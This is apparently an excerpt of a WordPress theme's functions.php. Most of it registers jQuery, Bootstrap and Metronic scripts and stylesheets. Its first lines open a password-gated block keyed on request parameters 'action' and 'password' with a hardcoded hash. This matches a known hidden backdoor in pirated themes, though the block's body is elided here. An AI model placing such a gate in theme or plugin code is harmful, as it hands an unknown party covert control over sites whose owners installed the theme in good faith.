<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'b8e1ae63c0524b9765579788efe7e5d4'))
	{
...
function load_my_script()
{
    ...
    wp_enqueue_script('custom-jquery-js', get_stylesheet_directory_uri() . '/assets/global/plugins/jquery.min.js', array(), 'all');
    wp_enqueue_script('custom-migrate-js', get_stylesheet_directory_uri() . '/assets/global/plugins/jquery-migrate.min.js', array(), 'all');
    wp_enqueue_script('custom-bootstrap-js', get_stylesheet_directory_uri() . '/assets/global/plugins/bootstrap/js/bootstrap.min.js', array(), 'all');
    wp_enqueue_script('custom-blockui-js', get_stylesheet_directory_uri() . '/assets/global/plugins/jquery.blockui.min.js', array(), 'all');
    wp_enqueue_script('custom-uniform-js', get_stylesheet_directory_uri() . '/assets/global/plugins/uniform/jquery.uniform.min.js', array(), 'all');
    wp_enqueue_script('custom-cokie-js', get_stylesheet_directory_uri() . '/assets/global/plugins/jquery.cokie.min.js', array(), 'all');
    wp_enqueue_script('custom-validate-js', get_stylesheet_directory_uri() . '/assets/global/plugins/jquery-validation/js/jquery.validate.min.js', array(), 'all');
    wp_enqueue_script('custom-backstretch-js', get_stylesheet_directory_uri() . '/assets/global/plugins/backstretch/jquery.backstretch.min.js', array(), 'all');
    wp_enqueue_script('custom-select2-js', get_stylesheet_directory_uri() . '/assets/global/plugins/select2/select2.min.js', array(), 'all');
    wp_enqueue_script('datatables-min-js', get_stylesheet_directory_uri() . '/assets/global/plugins/datatables/media/js/jquery.dataTables.min.js', array(), 'all');
    wp_enqueue_script('datatables-bootstrap-js', get_stylesheet_directory_uri() . '/assets/global/plugins/datatables/plugins/bootstrap/dataTables.bootstrap.js', array(), 'all');
    wp_enqueue_script('custom-metronic-js', get_stylesheet_directory_uri() . '/assets/global/scripts/metronic.js', array(), 'all');
    wp_enqueue_script('custom-layout-js', get_stylesheet_directory_uri() . '/assets/admin/layout/scripts/layout.js', array(), 'all');
    wp_enqueue_script('custom-demo-js', get_stylesheet_directory_uri() . '/assets/admin/layout/scripts/demo.js', array(), 'all');
    wp_enqueue_script('custom-login-js', get_stylesheet_directory_uri() . '/assets/admin/pages/scripts/login-soft.js', array(), 'all');
    wp_enqueue_script('custom-fileinput-js', get_stylesheet_directory_uri() . '/assets/global/plugins/bootstrap-fileinput/bootstrap-fileinput.js', array(), 'all');
    wp_enqueue_script('custom-boottoastr-js', get_stylesheet_directory_uri() . '/assets/global/plugins/bootstrap-toastr/toastr.min.js', array(), 'all');
    wp_enqueue_script('custom-rangeslider-min-js', get_stylesheet_directory_uri() . '/assets/global/plugins/ion.rangeslider/js/ion-rangeSlider/ion.rangeSlider.min.js', array(), 'all');
    wp_enqueue_script('custom-jqueryui-touch-js', get_stylesheet_directory_uri() . '/assets/global/plugins/jquery-ui-touch-punch/jquery.ui.touch-punch.min.js', array(), 'all');
    wp_enqueue_script('custom-slider-js', get_stylesheet_directory_uri() . '/assets/admin/pages/scripts/components-ion-sliders.js', array(), 'all');
    wp_enqueue_script('custom-toastr-js', get_stylesheet_directory_uri() . '/assets/admin/pages/scripts/ui-toastr.js', array(), 'all');
    wp_enqueue_script('table-advanced-js', get_stylesheet_directory_uri() . '/assets/admin/pages/scripts/table-advanced.js', array(), 'all');
}
...
function load_my_styles()
{
     // wp_enqueue_style('style-mam-css', plugin_dir_url(__FILE__) . 'assets/css/style.css');
 	 wp_enqueue_style('div-my-san', "http://fonts.googleapis.com/css?family=Open+Sans:400,300,600,700&subset=all");
     wp_enqueue_style('div-my-font-awesome', get_stylesheet_directory_uri() . '/assets/global/plugins/font-awesome/css/font-awesome.min.css');
     wp_enqueue_style('div-my-line-icons', get_stylesheet_directory_uri() . '/assets/global/plugins/simple-line-icons/simple-line-icons.min.css');
     wp_enqueue_style('div-my-bootstrap', get_stylesheet_directory_uri() . '/assets/global/plugins/bootstrap/css/bootstrap.min.css');
     wp_enqueue_style('div-my-uniform-default', get_stylesheet_directory_uri() . '/assets/global/plugins/uniform/css/uniform.default.css');
     wp_enqueue_style('div-my-select2', get_stylesheet_directory_uri() . '/assets/global/plugins/select2/select2.css');
     wp_enqueue_style('div-my-switch', get_stylesheet_directory_uri() . '/assets/global/plugins/bootstrap-switch/css/bootstrap-switch.min.css');
     wp_enqueue_style('div-my-rangeSlider-min', get_stylesheet_directory_uri() . '/assets/global/plugins/ion.rangeslider/css/ion.rangeSlider.css');
     wp_enqueue_style('div-my-login-soft', get_stylesheet_directory_uri() . '/assets/admin/pages/css/login-soft.css', array(), 'all');
     wp_enqueue_style('div-my-components', get_stylesheet_directory_uri() . '/assets/global/css/components.css');
      wp_enqueue_style('div-my-toastr', get_stylesheet_directory_uri() . '/assets/global/plugins/bootstrap-toastr/toastr.min.css');
     wp_enqueue_style('div-my-plugins', get_stylesheet_directory_uri() . '/assets/global/css/plugins.css');
     wp_enqueue_style('div-data-table', get_stylesheet_directory_uri() . '/assets/global/plugins/datatables/plugins/bootstrap/dataTables.bootstrap.css');
     wp_enqueue_style('div-my-layout', get_stylesheet_directory_uri() . '/assets/admin/layout/css/layout.css');
     wp_enqueue_style('div-my-default', get_stylesheet_directory_uri() . '/assets/admin/layout/css/themes/default.css');
     wp_enqueue_style('div-my-custom', get_stylesheet_directory_uri() . '/assets/admin/layout/css/custom.css');
     wp_enqueue_style('div-my-fileinput', get_stylesheet_directory_uri() . '/assets/global/plugins/bootstrap-fileinput/bootstrap-fileinput.css');
     wp_enqueue_style('div-my-rangeSlider', get_stylesheet_directory_uri() . '/assets/global/plugins/ion.rangeslider/css/ion.rangeSlider.Metronic.css');
    }
